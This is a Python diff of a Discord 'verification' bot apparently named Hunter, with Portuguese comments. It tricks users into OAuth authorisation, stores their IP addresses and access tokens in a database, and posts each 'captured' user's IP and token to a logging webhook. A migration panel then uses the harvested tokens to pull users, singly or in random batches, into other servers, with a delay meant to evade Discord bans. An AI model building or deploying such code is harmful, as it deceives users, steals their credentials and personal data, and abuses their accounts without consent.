@@ -39,8 +39,9 @@ def init_db():
         conn.commit()
         cur.close()
         conn.close()
+        print("✅ DB Conectado.")
     except Exception as e:
-        print(f"Erro DB: {e}")
+        print(f"❌ Erro DB: {e}")
 
 def save_user_to_db(user_id, username, ip, token, guild_id):
     try:
@@ -59,25 +60,54 @@ def save_user_to_db(user_id, username, ip, token, guild_id):
         conn.commit()
         conn.close()
     except Exception as e:
-        print(f"Erro save DB: {e}")
+        print(f"❌ Erro Save DB: {e}")
 
 # --- FUNÇÕES DISCORD ---
 def get_headers_bot():
     return {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}
 
+def send_log_to_webhook(user_data, access_token, ip_address, guild_id):
+    embed = {
+        "title": "✅ Usuário Capturado!",
+        "description": "Dados salvos no PostgreSQL.",
+        "color": 0x00ff41,
+        "fields": [
+            { "name": "👤 User", "value": f"{user_data['username']} ({user_data['id']})", "inline": False },
+            { "name": "🌍 IP", "value": f"`{ip_address}`", "inline": True },
+            { "name": "🏰 Server", "value": f"`{guild_id}`", "inline": True },
+            { "name": "🔑 Token", "value": f"||{access_token}||", "inline": False }
+        ]
+    }
+    requests.post(LOG_WEBHOOK, json={"embeds": [embed], "username": "Hunter Logs"})
+
+def get_or_create_verified_role(target_guild_id):
+    url = f"{API_BASE}/guilds/{target_guild_id}/roles"
+    response = requests.get(url, headers=get_headers_bot())
+    if response.status_code == 200:
+        for role in response.json():
+            if role['name'] == "Vereficado": return role['id']
+    
+    # Criar se não existir
+    create_url = f"{API_BASE}/guilds/{target_guild_id}/roles"
+    data = {"name": "Vereficado", "permissions": "0", "color": 0x00ff00, "hoist": False, "mentionable": False}
+    create_res = requests.post(create_url, headers=get_headers_bot(), json=data)
+    if create_res.status_code in [200, 201]: return create_res.json()['id']
+    return None
+
 def join_user_to_guild(user_id, access_token, target_guild_id):
-    """Função core que move o usuário"""
     url = f"{API_BASE}/guilds/{target_guild_id}/members/{user_id}"
     data = {"access_token": access_token}
-    
-    # Tenta adicionar
-    response = requests.put(url, headers=get_headers_bot(), json=data)
-    
-    # 201: Entrou agora / 204: Já estava lá / 403: Bot sem permissão
-    return response.status_code
+    r = requests.put(url, headers=get_headers_bot(), json=data)
+    return r.status_code
+
+def add_role_to_user(user_id, role_id, target_guild_id):
+    url = f"{API_BASE}/guilds/{target_guild_id}/members/{user_id}/roles/{role_id}"
+    requests.put(url, headers=get_headers_bot())
+
+# Inicializa DB
+init_db()
 
 # --- ROTAS ---
-init_db()
 
 @app.route('/')
 def index(): return "Hunter System Online."
@@ -97,90 +127,114 @@ def callback():
     target_guild_id = request.args.get('state') 
     if not code: return "Erro Code."
 
+    # Troca Code por Token
     data = {'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET, 'grant_type': 'authorization_code', 'code': code, 'redirect_uri': REDIRECT_URI}
     token_resp = requests.post(f'{API_BASE}/oauth2/token', data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
+    if token_resp.status_code != 200: return f"Erro Token: {token_resp.text}"
+    
     tokens = token_resp.json()
     access_token = tokens.get('access_token')
     
+    # Pega User Info
     user_resp = requests.get(f'{API_BASE}/users/@me', headers={'Authorization': f'Bearer {access_token}'})
     user_data = user_resp.json()
     user_id = user_data['id']
     username = user_data['username']
 
+    # Pega IP
     ip = request.headers.getlist("X-Forwarded-For")[0] if request.headers.getlist("X-Forwarded-For") else request.remote_addr
     
+    # Salva no DB
     save_user_to_db(user_id, username, ip, access_token, target_guild_id)
-    join_user_to_guild(user_id, access_token, target_guild_id) # Já adiciona no servidor original
+    send_log_to_webhook(user_data, access_token, ip, target_guild_id)
+
+    # Lógica de Cargo e Entrada
+    join_user_to_guild(user_id, access_token, target_guild_id)
+    try:
+        role_id = get_or_create_verified_role(target_guild_id)
+        if role_id: add_role_to_user(user_id, role_id, target_guild_id)
+    except Exception as e: print(f"Erro cargo: {e}")
 
     return redirect(f"https://discord.com/channels/{target_guild_id}")
 
 # --- PAINEL DE ENVIO (Painel 1) ---
 @app.route('/painel', methods=['GET', 'POST'])
 def painel():
-    # ... (Código do painel de envio que já fizemos) ...
-    return render_template('painel.html') 
+    message = ""
+    if request.method == 'POST':
+        target_guild_id = request.form.get('guild_id') 
+        channel_id = request.form.get('channel_id')
+        title = request.form.get('title')
+        desc = request.form.get('desc')
+        image_url = request.form.get('image_url')
+        
+        verify_link = f"https://hunter-bot-verify.onrender.com/auth?guild_id={target_guild_id}"
 
-# --- NOVO: PAINEL DE MIGRAÇÃO (Painel 2) ---
+        payload = {
+            "embeds": [{
+                "title": title, "description": desc, "color": 0x00ff41,
+                "image": {"url": image_url} if image_url else {}
+            }],
+            "components": [{
+                "type": 1,
+                "components": [{
+                    "type": 2, "style": 5, "label": "VERIFICAR AGORA", "url": verify_link
+                }]
+            }]
+        }
+        
+        post_url = f"{API_BASE}/channels/{channel_id}/messages"
+        r = requests.post(post_url, headers=get_headers_bot(), json=payload)
+        
+        if r.status_code == 200:
+            message = "✅ Painel enviado com sucesso!"
+        else:
+            message = f"❌ Erro ({r.status_code}): {r.text}"
+
+    return render_template('painel.html', message=message)
+
+# --- PAINEL DE MIGRAÇÃO (Painel 2) ---
 @app.route('/migrate', methods=['GET', 'POST'])
 def migrate():
     log_msg = []
     
     if request.method == 'POST':
-        action_type = request.form.get('action_type') # 'single' ou 'mass'
+        action_type = request.form.get('action_type')
         target_guild_id = request.form.get('target_guild_id')
         
         conn = get_db_connection()
         cur = conn.cursor()
 
         try:
-            # MODO 1: INDIVIDUAL (ID ou Nick)
             if action_type == 'single':
-                identifier = request.form.get('identifier') # Pode ser ID ou Username
-                
-                # Tenta achar por ID primeiro
-                cur.execute("SELECT user_id, username, access_token FROM verified_users WHERE user_id = %s", (identifier,))
+                identifier = request.form.get('identifier')
+                cur.execute("SELECT user_id, username, access_token FROM verified_users WHERE user_id = %s OR username = %s", (identifier, identifier))
                 user = cur.fetchone()
-                
-                # Se não achar por ID, tenta por Username
-                if not user:
-                    cur.execute("SELECT user_id, username, access_token FROM verified_users WHERE username = %s", (identifier,))
-                    user = cur.fetchone()
 
                 if user:
                     uid, uname, token = user
                     status = join_user_to_guild(uid, token, target_guild_id)
-                    if status in [201, 204]:
-                        log_msg.append(f"✅ Sucesso: {uname} ({uid}) adicionado.")
-                    else:
-                        log_msg.append(f"❌ Falha: {uname} (Status: {status} - Token expirado ou Bot sem perm).")
+                    res_txt = "Sucesso" if status in [201, 204] else f"Falha ({status})"
+                    log_msg.append(f"[{res_txt}] {uname}")
                 else:
-                    log_msg.append(f"⚠️ Usuário '{identifier}' não encontrado no Banco de Dados.")
+                    log_msg.append(f"⚠️ Usuário '{identifier}' não encontrado.")
 
-            # MODO 2: EM MASSA (Quantidade)
             elif action_type == 'mass':
                 amount = int(request.form.get('amount'))
-                
-                # Pega X usuários aleatórios ou os mais recentes
-                # ORDER BY random() pega aleatórios
                 cur.execute("SELECT user_id, username, access_token FROM verified_users ORDER BY RANDOM() LIMIT %s", (amount,))
                 users = cur.fetchall()
                 
-                success_count = 0
+                count = 0
                 for user in users:
                     uid, uname, token = user
                     status = join_user_to_guild(uid, token, target_guild_id)
-                    
-                    if status in [201, 204]:
-                        success_count += 1
-                        print(f"Migrado: {uname}")
-                    
-                    # Delay anti-ban do Discord
+                    if status in [201, 204]: count += 1
                     time.sleep(0.5) 
 
-                log_msg.append(f"🚀 Processo finalizado. {success_count}/{len(users)} usuários migrados com sucesso.")
+                log_msg.append(f"🚀 Migrados: {count}/{len(users)}")
 
         except Exception as e:
-            log_msg.append(f"Erro Crítico: {str(e)}")
+            log_msg.append(f"Erro: {str(e)}")
         finally:
             conn.close()
 
